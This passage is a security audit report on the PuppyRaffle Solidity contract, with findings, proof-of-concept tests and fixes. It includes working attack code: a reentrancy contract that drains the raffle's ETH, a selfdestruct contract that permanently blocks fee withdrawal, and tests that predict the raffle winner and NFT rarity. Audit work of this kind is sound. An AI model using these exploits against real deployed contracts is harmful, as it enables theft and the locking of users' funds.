---
title: PuppyRaffle Audit Report
author: SmileNot
date: September 13, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

/maketitle

<!-- Your report starts here! -->

Prepared by: [SmileNot](https://github.com/SmileNot9)
Lead Auditors: 
- [SmileNot](https://github.com/SmileNot9)

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Scope Details](#audit-scope-details)
  - [Compatibilities](#compatibilities)
  - [Roles](#roles)
- [Known issues](#known-issues)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] `PuppyRaffle::refund` performs an external call before updating the state, making it vulnerable to a reentrancy attack](#h-1-puppyrafflerefund-performs-an-external-call-before-updating-the-state-making-it-vulnerable-to-a-reentrancy-attack)
    - [\[H-2\] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to predict the winner and the minted puppy's rarity](#h-2-weak-randomness-in-puppyraffleselectwinner-allows-anyone-to-predict-the-winner-and-the-minted-puppys-rarity)
    - [\[H-3\] `PuppyRaffle::totalFees` might cause overflow and uses an unsafe cast, blocking the `PuppyRaffle::withdrawFees` function](#h-3-puppyraffletotalfees-might-cause-overflow-and-uses-an-unsafe-cast-blocking-the-puppyrafflewithdrawfees-function)
  - [Medium](#medium)
    - [\[M-1\] Smart contract raffle winners without a `fallback` or `receive` function cause `PuppyRaffle::selectWinner` to revert, discarding the legitimate winner](#m-1-smart-contract-raffle-winners-without-a-fallback-or-receive-function-cause-puppyraffleselectwinner-to-revert-discarding-the-legitimate-winner)
    - [\[M-2\] Looping through players array to check for duplicate players in `PuppyRaffle::enterRaffle` is vulnerable to a denial of service (DoS) attack](#m-2-looping-through-players-array-to-check-for-duplicate-players-in-puppyraffleenterraffle-is-vulnerable-to-a-denial-of-service-dos-attack)
    - [\[M-3\] Strict equality on the contract balance in `PuppyRaffle::withdrawFees` allows anyone to permanently block the function by force-sending ETH](#m-3-strict-equality-on-the-contract-balance-in-puppyrafflewithdrawfees-allows-anyone-to-permanently-block-the-function-by-force-sending-eth)
  - [Low](#low)
    - [\[L-1\] PuppyRaffle::getActivePlayerIndex returns 0 for both the first player and non-existent players, making them indistinguishable](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-both-the-first-player-and-non-existent-players-making-them-indistinguishable)
  - [Gas](#gas)
    - [\[G-1\] Unchanged state variables should be declared as `constant` or `immutable`](#g-1-unchanged-state-variables-should-be-declared-as-constant-or-immutable)
    - [\[G-2\] Storage variables in a loop should be cached](#g-2-storage-variables-in-a-loop-should-be-cached)
    - [\[G-3\] State is written to storage before the duplicate check in `PuppyRaffle::enterRaffle`, wasting gas on reverted transactions](#g-3-state-is-written-to-storage-before-the-duplicate-check-in-puppyraffleenterraffle-wasting-gas-on-reverted-transactions)
  - [Informational](#informational)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Using an outdated Solidity version is not recommended](#i-2-using-an-outdated-solidity-version-is-not-recommended)
    - [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-4\] Some events are missing `indexed` fields](#i-4-some-events-are-missing-indexed-fields)
    - [\[I-5\] Use of "magic" numbers in `PuppyRaffle::selectWinner` is discouraged](#i-5-use-of-magic-numbers-in-puppyraffleselectwinner-is-discouraged)
    - [\[I-6\] `PuppyRaffle::_isActivePlayer` function is never used](#i-6-puppyraffle_isactiveplayer-function-is-never-used)
    - [\[I-7\] `PuppyRaffle::refund` emits `RaffleRefunded` after the external call, allowing events to be emitted out of order](#i-7-puppyrafflerefund-emits-rafflerefunded-after-the-external-call-allowing-events-to-be-emitted-out-of-order)
    - [\[I-8\] `PuppyRaffle::refund` requires the caller to supply their own array index, which is error-prone and unnecessary](#i-8-puppyrafflerefund-requires-the-caller-to-supply-their-own-array-index-which-is-error-prone-and-unnecessary)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.


# Disclaimer

The SmileNot team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Scope Details 

- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
- In Scope:

```
./src/
#-- PuppyRaffle.sol
```

## Compatibilities

- Solc Version: 0.7.6
- Chain(s) to deploy contract to: Ethereum

## Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

# Known issues

None

## Issues found

| Severity    | Nº of issues found |
| ----------- | ------------------ |
| High        | 3                  |
| Medium      | 3                  |
| Low         | 1                  |
| Gas         | 3                  |
| Informative | 8                  |
| Total       | 18                 |

# Findings

## High

### [H-1] `PuppyRaffle::refund` performs an external call before updating the state, making it vulnerable to a reentrancy attack

**Description:** `PuppyRaffle::refund` does not respect the CEI pattern. The low-level call inside `payable(msg.sender).sendValue(entranceFee)` is executed before the player is removed from `players` array. This hands control to the attack contract creating the possibility to a reentrancy attack which allows the attacker to drain all the funds.  

```solidity
    // @audit Reentrancy attack
@>  payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
```  

**Impact:** This creates an opportunity for a malicious user to drain all the funds held by the contract through a cyclic reentrancy attack until the contract is empty.

**Proof of Concept:** In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. The test adds a malicious contract which enters the raffle through `attackContract.startAttack();`.  
This malicious contract enters the raffle and fires a refund triggering the low-level call in `PuppyRaffle::refund`. That hands control over to `ReentrancyContract::receive` firing the reentrancy and emptying the `PuppyRaffle` contract in the process.  

In this case we get as outputs:  

```
=== INITIAL STATE ===
Initial attacker balance  : 1000000000000000000
Initial victim balance    : 4000000000000000000
=== FINAL STATE ===
Final attacker balance    : 5000000000000000000
Final victim balance      : 0
Reentrancy was successful!
```  

The contract is fully drained.  

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
    function test_reentrancyRefund() public playersEntered {
        ReentrancyContract attackContract = new ReentrancyContract(puppyRaffle);
        vm.deal(address(attackContract), 1 ether);

        uint256 initialAttackerBalance = address(attackContract).balance;
        uint256 initialVictimBalance = address(puppyRaffle).balance;
        console2.log("=== INITIAL STATE ===");
        console2.log("Initial attacker balance  : ", initialAttackerBalance);
        console2.log("Initial victim balance    : ", initialVictimBalance);

        attackContract.startAttack();

        uint256 finalAttackerBalance = address(attackContract).balance;
        uint256 finalVictimBalance = address(puppyRaffle).balance;
        console2.log("=== FINAL STATE ===");
        console2.log("Final attacker balance    : ", finalAttackerBalance);
        console2.log("Final victim balance      : ", finalVictimBalance);

        if(initialAttackerBalance < finalAttackerBalance) {
            console2.log("Reentrancy was successful!");
        } else {
            console2.log("Reentrancy failed");
        }
    }
}

// This goes outside the PuppyRaffleTest contract
contract ReentrancyContract {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function startAttack() external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```  
</details>  
  

**Recommended Mitigation:** There is a main recommendations:  

1. Consider following the CEI pattern, which updates state before the external call, removing any reentrancy possibility. Example:  

```diff
    function refund(uint256 playerIndex) public {
+       // Checks
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);

+       // Effects
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

+       // Interactions
+       payable(msg.sender).sendValue(entranceFee);
    }
```  

2. Consider using a battle-tested library such as [`ReentrancyGuard`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) from OpenZeppelin. Example:  

```diff
    ...

    import {Base64} from "lib/base64/base64.sol";
+   import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

    ...
    
-   contract PuppyRaffle is ERC721, Ownable {
+   contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    
    ...

-       function refund(uint256 playerIndex) public {
+       function refund(uint256 playerIndex) public nonReentrant {
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);

            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }
```  

3. Consider adding a new lock variable, like a bool, which locks the entrance at the start of the function and unlocks it at the end. Example:  

```diff
    ...

    address public previousWinner;
+   bool public locked;

    ...

        function refund(uint256 playerIndex) public {
+           if (locked) revert();
+           locked = true;

            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);

            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
+           locked = false;
        }
```  


### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to predict the winner and the minted puppy's rarity

**Description:** `PuppyRaffle::selectWinner` uses as a source of randomness: `msg.sender`, `block.timestamp` and `block.difficulty` to select the `PuppyRaffle::winnerIndex` and `PuppyRaffle::rarity` — none of which is a safe source of randomness. `block.timestamp` and `block.difficulty` can be known within the block and `msg.sender` can be manipulated by an attacker — by grinding addresses off-chain — until the hash produces the outcome they want, then submit the transaction.

```solidity
    // @audit notRandom
@>  uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    ...

@>  uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```  

Because `msg.sender` is fully controlled by the caller, an attacker does not need to wait for favorable conditions: within a single block, where `block.timestamp` and `block.difficulty` are already known, the search space is tiny (`PuppyRaffle::players.length` outcomes for the winner, `100` for the rarity), so grinding an address that yields the desired result is trivial.

**Impact:** Any user can predict the outcome for the winner and rarity and win the prize pool and the rarity they want. As a result, honest users have no real chance of winning, which makes the raffle fundamentally broken rather than merely unfair. `PuppyRaffle::winnerIndex` weak randomness is a high severity while `PuppyRaffle::rarity` is a medium.

**Proof of Concept:** 
<details> <summary>PoC 1 — Predictable winner</summary>  

In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. Using the same non-random calculation in `PuppyRaffle.sol` we store the expected winner before firing `PuppyRaffle::selectWinner`. After firing `PuppyRaffle::selectWinner` we store that real winner and compare it to the expected one confirming that both match. This means that someone can fire `PuppyRaffle::selectWinner` controlling the `msg.sender` and combining with the other two known inputs to get its address index.  

In this case we get as outputs:  

```
The expected winner is    :  0x0000000000000000000000000000000000000004
The real winner is        :  0x0000000000000000000000000000000000000004
Expected winner == real winner
```  

The contract sends the reward to a predetermined user.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomWinnerIndex() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // `playersEntered` enters 4 users, so players.length is hardcoded here
    // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
    uint256 expectedIndexWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    address expectedWinner = puppyRaffle.players(expectedIndexWinner);

    puppyRaffle.selectWinner();

    address realWinner = puppyRaffle.previousWinner();
    console2.log("The expected winner is    : ", expectedWinner);
    console2.log("The real winner is        : ", realWinner);

    if (expectedWinner == realWinner) console2.log("Expected winner == real winner");
    assertEq(expectedWinner, realWinner, "winner was not predictable");
}
```  
</details>  

<details> <summary>PoC 2 — Predictable puppy rarity</summary>  

Same setup as PoC 1. We calculate the expected rarity with the same parameter as we know the `PuppyRaffle::rarity` will do. Then `PuppyRaffle::selectWinner` its fired and we store the real rarity outcome. When comparing it against each other we get both are equal. Meaning `PuppyRaffle::rarity` uses weak and predictable randomness which someone can take advantage selecting the rarity they want.  

In this case we get as outputs:  

```
Expected rarity :  70
Actual rarity   :  70
Expected rarity == actual rarity
```  

The contract gives a predefined rarity.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomRarity() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // Reproduce the on-chain calc: `address(this)` is the msg.sender of selectWinner()
    uint256 rarity = uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;
    uint256 expectedRarity;
    if (rarity <= puppyRaffle.COMMON_RARITY()) {
        expectedRarity = puppyRaffle.COMMON_RARITY();
    } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
        expectedRarity = puppyRaffle.RARE_RARITY();
    } else {
        expectedRarity = puppyRaffle.LEGENDARY_RARITY();
    }

    uint256 tokenId = puppyRaffle.totalSupply(); // 0 for the first mint

    puppyRaffle.selectWinner();

    uint256 actualRarity = puppyRaffle.tokenIdToRarity(tokenId);
    console2.log("Expected rarity : ", expectedRarity);
    console2.log("Actual rarity   : ", actualRarity);
    if (expectedRarity == actualRarity) console2.log("Expected rarity == actual rarity");
    assertEq(actualRarity, expectedRarity, "rarity was not predictable");
}
```  
</details>  

**Recommended Mitigation:** Use [Chainlink VRF](https://docs.chain.link/vrf) for both the winner index and the rarity roll. This external oracle provides verifiable on-chain randomness. It requires two steps: request the random number and then a callback in `fulfillRandomWords`. It will also be necessary to restructure `PuppyRaffle::selectWinner` for proper functionality.  

No block variable (`timestamp`, `prevrandao`, `blockhash`, `difficulty`, `number`) should ever be used as a source of randomness on-chain.  


### [H-3] `PuppyRaffle::totalFees` might cause overflow and uses an unsafe cast, blocking the `PuppyRaffle::withdrawFees` function

**Description:** `PuppyRaffle::totalFees` is declared as a uint64 variable instead of a uint256. This causes two bugs:  
1. Unsafe cast: `PuppyRaffle::fee` is declared as a uint256 but when calculating `PuppyRaffle::totalFees` its casted to uint64 without any safety. If: fee > type(uint64).max (~18.44 ETH) the variable wraps modulo $2^{64}$ — the high bits are silently discarded, so totalFees ends up far below the real amount. For that to happen would be needed $\approx$ 93 players (if `PuppyRaffle::entranceFee` = 1 ETH): 93 players * 1 ETH * 20 / 100 = 18.6 ETH > type(uint64).max.
2. Overflow: raffles whose individual fee fits in uint64 still may cause an overflow in `PuppyRaffle::totalFees` as its a uint64 declared variable. The accumulated sum in totalFees wraps modulo $2^{64}$ as well.

```solidity
@>  uint64 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

            // @audit overflow & casting
@>          totalFees = totalFees + uint64(fee);
```  

**Impact:** As a consequence of this bug, uint64 variable and the uint64 forced cast might silently wrap modulo $2^{64}$ without any warning causing the loss of the real value of `PuppyRaffle::totalFees`. Both bugs leads to a block of `PuppyRaffle::withdrawFees` function, which uses `PuppyRaffle::totalFees` to send the fees and its `require(address(this).balance == uint256(totalFees))`, as this last require could not be passed the function stay locked forever.

**Proof of Concept:** In the following test we can see how the unsafe cast corrupts the real accounting of `PuppyRaffle::fee` reflected in `PuppyRaffle::totalFees`. Since the raffle was initialized from the start, total fees was 0 so it couldn't be the problem. `PuppyRaffle::totalFees` and its overflow bug is not tested in the PoC but also produces the same issue and its fixes are the same as the unsafe cast.

<details> <summary>PoC</summary>

In the following test we clearly see how the real output — uint64 variable — overflows without any warning.  

In this case we get as outputs:  

```
The expected total fees are    : 19000000000000000000
The real total fees are        : 553255926290448384
```

The uint64 value wrapped: 19e18 was stored as 19e18 - $2^{64}$ $\approx$ 0.55e18.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_UnsafeCast() public {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    uint256 numPlayers = 95;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i + 1_000_000);
    }
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

    // Manual calculation in uint256
    uint256 expectedTotalAmountCollected = players.length * entranceFee;
    uint256 expectedFee = (expectedTotalAmountCollected * 20) / 100;
    uint256 expectedTotalFees = expectedFee;

    assertEq(uint256(puppyRaffle.totalFees()), uint256(0), "total fees should be 0 before entering the raffle");
    assertGt(expectedFee, type(uint64).max, "expected fee should be greater than the maximum value of uint64");
        
    puppyRaffle.selectWinner();

    // Real result in uint64
    uint64 realTotalFees = puppyRaffle.totalFees();

    console2.log("The expected total fees are    : ", expectedTotalFees);
    console2.log("The real total fees are        : ", uint256(realTotalFees));
    assertLt(uint256(realTotalFees), expectedTotalFees, "real total fees should be less than the expected value");

    // Withdraw function results in a block
    assertTrue(address(puppyRaffle).balance != uint256(realTotalFees), "puppyRaffle balance shouldn't be equal to the real total fees");
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```  
</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Change the `PuppyRaffle::totalFees` type variable from uint64 to uint256 and remove the forced cast. This solves the issue as the max of a uint256 variable is huge — 1.158e77 —, compared against the uint64 max — 1.845e19.  

```diff
    ...

-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

-           totalFees = totalFees + uint64(fee);
+           totalFees = totalFees + fee;
```  

2. Consider using the library [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol) and [`SafeCast`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.2.0/contracts/utils/SafeCast.sol) from OpenZeppelin. For compiler 0.7.6 use v3.4.0 from the contract library. 

```diff
    ...
    import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+   import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";
+   import {SafeCast} from "@openzeppelin/contracts/utils/SafeCast.sol";

    ...

    contract PuppyRaffle is ERC721, Ownable {
        using Address for address payable;
+       using SafeMath for uint256;
+       using SafeCast for uint256;

        ...

-       totalFees = totalFees + uint64(fee);
+       totalFees = uint256(totalFees).add(fee).toUint64();        
```  

Consider that ".toUint64()" will fire a revert which removes the unwarned truncation but does not fix the uint64 space issue. Knowing that, mitigation 2 is better only if the uint64 is strictly wanted, if not, use mitigation 1.  



## Medium

### [M-1] Smart contract raffle winners without a `fallback` or `receive` function cause `PuppyRaffle::selectWinner` to revert, discarding the legitimate winner

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. If the low-level call (`(bool success,) = winner.call{value: prizePool}("");`) does not succeed, `success` would be false and revert in the next `require` line. Same issue happens with `_safeMint` if the recipient does not implement `IERC721Receiver`. Due to that, the winner of that raffle would be discarded.  

```solidity
    function selectWinner() external {
        ...

@>      (bool success,) = winner.call{value: prizePool}("");
@>      require(success, "PuppyRaffle: Failed to send prize pool to winner");
@>      _safeMint(winner, tokenId);
```  

**Impact:** If the winner turns out to be a smart contract without any `fallback` or `receive` function, the transaction will revert causing the selected winner to be discarded silently.  
Same issue applies to `_safeMint`, which calls `onERC721Received` on the recipient. A contract that accepts ETH but does not implement `IERC721Receiver` will not accept the NFT and revert the whole transaction resulting in the same consequences as before. Either failure point discards the winner.  

**Proof of Concept:** 
1. Four users (or more) enter the raffle, one of them being a smart contract wallet without any `fallback` or `receive` function.
2. The raffle ends.
3. `PuppyRaffle::selectWinner` fires and that one smart contract wallet wins. The contract tries to send the prize to the winner but, as it does not have any `fallback` or `receive` function, the call reverts and the winner gets nothing.
4. Now the next call of `PuppyRaffle::selectWinner` function might select a different winner.

*Note: Same issue applies to a smart contract wallet that does not implement `IERC721Receiver`, whole transaction will revert discarding the winner in the process.*

**Recommended Mitigation:** There are a few mitigations to apply:
1. Create a mapping of address -> payout amount so winners can claim their payout whenever they want through a new function designed to meet that need. Claiming must also cover the NFT, not just the ETH. Either mint with `_mint` instead of `_safeMint`, or have the winner claim the NFT through the same pull mechanism.
2. Do not allow smart contract wallets to enter the raffle (not recommended: breaks legitimate smart contract wallets from real users).  


### [M-2] Looping through players array to check for duplicate players in `PuppyRaffle::enterRaffle` is vulnerable to a denial of service (DoS) attack

**Description:** As each new player is added to the `PuppyRaffle::players` array, the function must perform a nested loop over the entire array to check for duplicates. This makes each interaction more gas expensive, since it has to do more comparisons. If the array is long enough, it results in an expensive gas execution of the transaction reaching a dramatically expensive cost for the last players. 

```solidity
    // @audit DoS Attack
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas cost for each new player will increase, making it prohibitively expensive for new users to enter once the array is long enough. This discourages later users from entering and causes a rush at the start of the raffle to be one of the first entrants in the queue. Also can happen that the gas required by `PuppyRaffle::enterRaffle` exceeds the block gas limit, permanently blocking any further entries.  

**Proof of Concept:** In the following test we can see how this gas increment is applied when we have two sets of 100 players.  

In this case we get as outputs:  

```
-Gas spent for the first 100 players: 6503222
-Gas spent for the second 100 players: 18995459
```

That's almost 3x more expensive.  

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`.

```solidity
function test_denialOfService() public {
    vm.txGasPrice(1);

    // We enter our first 100 players
    uint256 numPlayers = 100;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i);
    }

    // We calculate the gas spent
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
    uint256 gasEnd = gasleft();

    uint256 gasSpentOne = gasStart - gasEnd;
    console.log("Gas spent for the first 100 players: ", gasSpentOne);

    // Next 100 players
    address[] memory playersTwo = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        playersTwo[i] = address(i + numPlayers);
    }

    // We calculate the gas spent
    gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
    gasEnd = gasleft();

    uint256 gasSpentTwo = gasStart - gasEnd;
    console.log("Gas spent for the second 100 players: ", gasSpentTwo);

    assert(gasSpentOne < gasSpentTwo);
}
```  

</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider allowing duplicates. Users can create new wallet addresses anyway, so checking for duplicates does not stop the same user from entering multiple times.
2. Consider using a mapping with a require to check for duplicates. This eliminates the nested for loop and, as a consequence, the DoS vector.

```diff
    address public previousWinner;
+   uint256 public raffleId = 0;

    ...

    mapping(uint256 => string) public rarityToName;
+   mapping(address => uint256) public addressToRaffleId;

    ...
    
        function enterRaffle(address[] memory newPlayers) public payable {
            require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

            for (uint256 i = 0; i < newPlayers.length; i++) {
+               require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+               addressToRaffleId[newPlayers[i]] = raffleId;
                players.push(newPlayers[i]);
            }

-           // Check for duplicates
-           for (uint256 i = 0; i < players.length - 1; i++) {
-               for (uint256 j = i + 1; j < players.length; j++) {
-                   require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-               }
-           }
            emit RaffleEnter(newPlayers);
        }

        ...

        function selectWinner() external {
+           raffleId = raffleId + 1;
```  


### [M-3] Strict equality on the contract balance in `PuppyRaffle::withdrawFees` allows anyone to permanently block the function by force-sending ETH

**Description:** `PuppyRaffle::withdrawFees` function uses a strict equality between `address(this).balance` and `uint256(totalFees)`. Any user (whether malicious or not) can force-send ETH to the contract breaking this strict equality and permanently blocking the function. Sending more ETH cannot fix the block: `address(this).balance` can only increase, so once it exceeds `totalFees` the equality can never hold again.  

```solidity
    function withdrawFees() external {
        // @audit Mishandling ETH
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```  

**Impact:** The contract remains without any possibility to withdraw the fees. The rest of the contract functionality will still work but accumulated fees will remain permanently blocked in the contract.

**Proof of Concept:** In the following test we can see how, after an external contract fires `selfdestruct` (which resides in `SelfDestructiveContract::destroy` function) with PuppyRaffle address as the receiver, the `PuppyRaffle::withdrawFees` function fires the revert from its first require causing a permanent block.  

<details> 
<summary>PoC</summary>  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
    function test_StrictEqualityBlocks() public playersEntered {
        SelfDestructiveContract selfDestructiveContract = new SelfDestructiveContract(puppyRaffle);
        vm.deal(address(selfDestructiveContract), 1 wei);
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
        vm.roll(block.number + 1);

        selfDestructiveContract.destroy();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

...

// This goes outside the PuppyRaffleTest contract
contract SelfDestructiveContract {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function destroy() external {
        selfdestruct(payable(address(puppyRaffle)));
    }
}
```  

*Note that since EIP-6780 (Cancun), selfdestruct no longer deletes the contract unless called in the same transaction as its creation, but it still forwards the balance, which is all that is needed here.*  
</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider changing the strict equality `==` to checking the `players` length which correctly enforces that no active player remains in the raffle and removes the ETH mishandling issue.  

```diff
function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+       require(players.length == 0, "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
```  

This solves the ETH mishandling but the force-sent ETH will still be blocked in the contract because `totalFees` variable does not account for it. If this ETH needs to be withdrawn there are two main changes to apply:  

```diff
    ...

    address public feeAddress;
-   uint64 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

-           totalFees = totalFees + uint64(fee);

            ...
        }

        function withdrawFees() external {
            require(players.length == 0, "PuppyRaffle: There are currently players active!");
-           uint256 feesToWithdraw = totalFees;
+           uint256 feesToWithdraw = address(this).balance;
            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
            require(success, "PuppyRaffle: Failed to withdraw fees");
        }
```  
*Note: In the code above, totalFees variable is removed as it is not needed anymore, we use address(this).balance instead.*

or

```solidity
function removeExceededETH() external onlyOwner {
    uint256 exceededETH = address(this).balance - uint256(totalFees);
    require(exceededETH != 0, "PuppyRaffle: There isn't any exceeded ETH");

    (bool success,) = feeAddress.call{value: exceededETH}("");
    require(success, "PuppyRaffle: Failed to withdraw exceeded ETH");
} 
```  
*The code above should be placed in PuppyRaffle contract to withdraw the exceeded fees.*  

The last snippet mitigates the bug without changing `PuppyRaffle::withdrawFees` function. `PuppyRaffle::withdrawFees` will still get blocked but firing `PuppyRaffle::removeExceededETH` unlocks it as the exceeded ETH is removed. The downside of this solution is that the block is still possible and every time it happens `PuppyRaffle::removeExceededETH` needs to be called.   

As a conclusion, `address(this).balance` should never be used in a strict equality. A contract's balance can always be increased by external parties without executing any of its code. This might break some contract functionality as in the `PuppyRaffle::withdrawFees` case.  



## Low

### [L-1] PuppyRaffle::getActivePlayerIndex returns 0 for both the first player and non-existent players, making them indistinguishable

**Description:** If a player is in index 0 in `players` array will get 0 as output when calling `PuppyRaffle::getActivePlayerIndex` function. This output is the same one as for a non-existing player. This might confuse the player as they don't know whether they are in the raffle or not.  

```solidity
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
@>              return i;
            }
        }
@>      return 0;
    }
```  

**Impact:** Player assigned with the index 0 in `players` array might think they have not entered the raffle as it is the same output for a non-existing player. This may lead the player to attempt to enter the raffle again, wasting gas.  
Also, the return value is also used to build calls to `refund(playerIndex)`. Since 0 is both a valid index and non-existing player, any integration that trusts this return value operates on the wrong player.  

**Proof of Concept:** 
1. First user enters the raffle.
2. User calls `PuppyRaffle::getActivePlayerIndex` and gets 0 as output.
3. User might think they have not entered the raffle due to the function documentation which states that 0 means non-active.

**Recommended Mitigation:** There are two recommendations:
